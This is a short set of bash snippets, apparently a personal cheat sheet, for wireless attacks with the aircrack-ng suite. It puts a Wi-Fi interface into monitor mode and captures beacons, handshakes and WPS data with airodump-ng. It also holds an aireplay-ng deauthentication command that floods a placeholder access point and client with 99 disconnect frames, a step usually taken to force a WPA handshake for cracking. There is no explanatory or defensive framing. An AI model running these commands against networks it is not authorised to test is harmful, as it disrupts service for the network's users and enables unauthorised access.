```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

```bash
airmon-ng start wlan0
```

```bash
airodump-ng wlan0 --band a --manufacturer --beacons --showack --wps --uptime -w out

airodump-ng wlan0 --band bg --manufacturer --beacons --showack --wps --uptime -w out
```

```bash
iwconfig wlan0 channel 4

aireplay-ng -0 99 -a BSSID -c TARGET wlan0
```

```bash
kill -9 `ps aux | grep -i aircrack | awk '{print $2}'`
```
